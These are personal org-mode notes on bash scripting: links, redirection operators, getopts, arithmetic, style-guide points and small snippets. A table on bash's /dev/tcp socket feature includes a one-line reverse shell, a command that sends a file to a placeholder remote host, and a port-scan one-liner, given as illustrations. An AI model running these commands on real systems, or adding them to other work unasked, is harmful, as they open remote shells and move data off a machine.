- terminal emulators
  - kitty
    - https://sw.kovidgoyal.net/kitty/
    - glxgears https://github.com/michaeljclark/glkitty

- tool: regex dot plot
  - https://github.com/katef/libfsm/
  - ? https://github.com/katef/kgt/

- svg into png https://manpages.ubuntu.com/manpages/trusty/man1/rsvg-convert.1.html

- PS1's
  - ";"
    - allows you to copy multiple commands (also on rc shell)
    - PS1='%(?.%(!.#.;).%F{6}%B;%b%f) '

- dialog
  - all languages https://wiki.archlinux.org/title/GTK/Development
  - https://github.com/v1cont/yad/
  - https://gitlab.gnome.org/GNOME/zenity
  - https://invisible-island.net/dialog/
  - https://github.com/charmbracelet/gum

- https://en.wikipedia.org/wiki/ANSI_escape_code
- article 24
  https://mtlynch.io/zig-extraneous-build/#my-mental-model-of-bash-pipelines-is-wrong
  https://hackaday.com/2024/03/28/is-your-mental-model-of-bash-pipelines-wrong/
- article https://muhammadraza.me/2023/webscraping-in-bash/
- article https://muhammadraza.me/2023/shell-functions/
- article https://garnix.io/blog/contextual-cli
- https://github.com/dylanaraps/writing-a-tui-in-bash
- https://www.commandlinefu.com/
- https://command-not-found.com/
- "Destructuring" with *read* https://stackoverflow.com/questions/1952404/linux-bash-multiple-variable-assignment
- https://www.mulle-kybernetik.com/modern-bash-scripting/
- https://github.com/xwmx/bash-boilerplate
- https://github.com/dylanaraps/pure-sh-bible
- https://github.com/dylanaraps/pure-bash-bible
- https://github.com/mrzool/bash-sensible
- https://github.com/joseluisq/awesome-bash-commands
- https://lobste.rs/s/iofste/please_stop_writing_shell_scripts
- Why doesn't set -e (or set -o errexit, or trap ERR) do what I expected?
  http://mywiki.wooledge.org/BashFAQ/105
- shfmt
  https://github.com/mvdan/sh
  (fork?) https://github.com/patrickvane/shfmt
- Example: concatenation
  $ cut -d: -f2 studentlist.txt | xargs printf "%s@example.com"
- Common lines between files
  $ grep -Fxf file1 file2
  $ grep --fixed-strings --line-regexp --file file1 file2
- Not common lines
  $ grep -vFxf file1 file2
- https://wizardzines.com/comics/bash-debugging/
  https://news.ycombinator.com/item?id=39568728

- LLM
  https://hackaday.com/2023/12/29/using-local-ai-on-the-command-line-to-rename-images-and-more/
  https://justine.lol/oneliners/
  https://gist.github.com/jart/bd2f603aefe6ac8004e6b709223881c0

* Language

- exec CMD
  - make cmd replace the current shell, no new process is created

- Process substitution
  - careful of not forgetting an "<" in "cmd < <(cmd2)"
  - "cmd | tee >(cmd2) >(cmd3)" - sends "cmd" output to both "cmd2" and "cmd3" stdin https://tecadmin.net/bash-process-substitution/

- Brace Expansion
  - support integer zero padding
  - supports a step {FROM..TO..STEP}
  - you can use an "enumeration" on a "for loop" using "for i in {this,that,theother}"

- coproc [NAME] cmd [redirections]
  - like running "cmd &"
  - stdout in NAME[0], stdin in NAME[1]
  - "wait"

- commands run in a pipeline run at the same time
  https://mtlynch.io/zig-extraneous-build/#my-mental-model-of-bash-pipelines-is-wrong

- << EOF here document
  <<- EOF here document, ignore leading tabs

** Redirections

https://tldp.org/LDP/abs/html/io-redirection.html

- append output also to file
  - exec &>> file.txt
  - exec > <(tee file.txt) 2>&1

- <filename cmd1              - alternative to cat pipe
  <filename >outfile cmd1

- Redirection Operators
  - "|&" https://stackoverflow.com/questions/35917552/what-does-the-syntax-mean-in-shell-language
  - "<>" https://bash.cyberciti.biz/guide/Opening_the_file_descriptors_for_reading_and_writing
  |-------------+------------------------------------------------|
  | ¦&          | shorthand for "2>&1 ¦"                         |
  | [n]<>word   | opens fd n at word, for r/w                    |
  | [n]<&word   | duplicates fd                                  |
  | [n]>&word   | duplicates fd                                  |
  | [n]<&-      | closes fd n (or 0)                             |
  | [n]<&digit- | moves fd digit to n (or 0), closes digit after |
  | [n]>&digit- | moves fd digit to n (or 1)                     |
  |-------------+------------------------------------------------|

- feature: open client socket
  - https://medium.com/@stefanos.kalandaridis/bash-ing-your-network-f7069ab7c5f4
  - /dev/tcp/host/port
    /dev/udp/host/port
  - Examples:
    |---------------+-----------------------------------------------------------------------------------|
    | port scanning | timeout 0.5 echo < /dev/tcp/127.0.0.1/777/ && echo "open" ¦¦ echo "closed"        |
    | read stream   | cat < /dev/tcp/time.nist.gov/13                                                   |
    | receive file  | cat < /dev/tcp/remote.ip/1234 > file.txt                                          |
    | send file     | cat file.txt > /dev/tcp/remote.ip/4321                                            |
    | reverse shell | bash -c 'bash -i >& /dev/tcp/remote.ip/7777 0>&1'                                 |
    |---------------+-----------------------------------------------------------------------------------|
    | http request  | exec 5<>/dev/tcp/www.google.com/80                                                |
    |               | >&5 echo -e "GET / HTTP/1.1\r\nHost: www.google.com\r\nConnection: close\r\n\r\n" |
    |               | <&5 cat                                                                           |
    |---------------+-----------------------------------------------------------------------------------|
    * could have used "here documents" for the GET, using cat and >&5

** Special Parameters

|----+---------------------------|
| $_ | argument of last command  |
| $? | exit code of last command |
| $$ | self PID                  |
| $! | recent bg PID             |
|----+---------------------------|
| $# | number of arguments       |
| $0 | name of the script        |
| $* |                           |
| $@ |                           |
|----+---------------------------|

** getopt(s)

https://en.wikipedia.org/wiki/Getopts
- 1986-
- based on C's getopt

#+begin_src bash
  while getopts ":hf:" arg; do
      case $arg in
          h)  echo "help"; exit 1 ;;
          f)  echo "argument given: $OPTARG" ;;
          :)  echo "Mandatory argument missing for given flag $OPTARG"; exit 1;;
          \?) echo "Unknown flag";  exit 1;;
      esac
  done
  shift $((OPTIND - 1)) # allow positional arguments
#+end_src

** Arithmetic Evaluation $(())

- Equivalent to "let expressions"
  let arg [arg ...]

- "Evaluation is done in fixed-width *integers* with no check for overflow,
   though division by 0 is trapped and flaged as an error."
  - aka NOT floats

- "A shell variable that is null or unset evaluates to 0"

*** Operators
From man
|-----------------------------------+---------------------------------------------|
| id++ id--                         | variable post-increment and  post-decrement |
| ++id --id                         | variable pre-increment and pre-decrement    |
| + -                               | unary minus and plus                        |
| **                                | exponentiation                              |
| * / %                             | multiplication, division, remainder         |
| + -                               | addition, subtraction                       |
|-----------------------------------+---------------------------------------------|
| !                                 | logical negation                            |
| <= >= < >                         | comparison                                  |
| == !=                             | equality and inequality                     |
| &&                                | logical AND                                 |
| ¦¦                                | logical OR                                  |
|-----------------------------------+---------------------------------------------|
| expr?expr:expr                    | conditional operator                        |
| = *= /= %= += -= <<= >>= &= ^= ¦= | assignment                                  |
| expr1 , expr2                     | comma                                       |
|-----------------------------------+---------------------------------------------|
| ~                                 | bitwise negation                            |
| << >>                             | bitwise left and right shifts               |
| &                                 | bitwise AND                                 |
| ^                                 | bitwise exclusive OR                        |
| ¦                                 | bitwise OR                                  |
|-----------------------------------+---------------------------------------------|


* Tutorial: Style https://google.github.io/styleguide/shellguide.html

  - Don’t brace-delimit single character shell specials / positional parameters,
    unless strictly necessary or avoiding deep confusion.
  - Indentation: Indent 2 spaces. No tabs.
  - Comment at the header
    #+begin_src bash
      #!/bin/bash
      #
      # Perform hot backups of Oracle databases.
    #+end_src
  - Redirect errors to STDERR
    #+begin_src bash
      err() {
        echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
      }
    #+end_src
  - Do not put an extension on executables, only on libraries
  - Guidelines
    - When is ok
      * mostly calling other utilities
      * relatively little data manipulation
    - When NOT use
      * Scripts more than 100 lines long
      * Using non-straightfoward control flow logic
      * if performance matters

* Codebases

- maze solver https://gist.github.com/xsot/99a8a4304660916455ba2c2c774e623a
- web server https://github.com/dzove855/Bash-web-server
- web framework https://github.com/emasaka/shails
- web framework
  https://github.com/cgsdev0/bash-stack/
  https://bashsta.cc/0-index
- minecraft server
  https://sdomi.pl/weblog/15-witchcraft-minecraft-server-in-bash/
  https://github.com/sdomi/witchcraft
  https://news.ycombinator.com/item?id=30347501

* Snippets

#+NAME: scramble string
#+begin_src bash
echo -n "${1}" | fold -w1 | sort -R | xargs -ILETTER echo -n LETTER

echo -n "${1}" | while read -n1 -r letter; do
     echo $letter
done | sort -R | xargs -ILETTER echo -n LETTER
#+end_src

#+begin_src bash
  die() { echo $1 >&2; exit 1; } # some_command || die "oh no!"
#+end_src

#+begin_src bash
  for cmd in sgr0 bold; do
    tput $cmd
    for i in $(seq 0 7); do
      for j in $(seq 0 7); do
        tput setaf $i; tput setab $j; echo -n " $i,$j "
      done
      tput sgr0; echo; tput $cmd
    done
  done
#+end_src
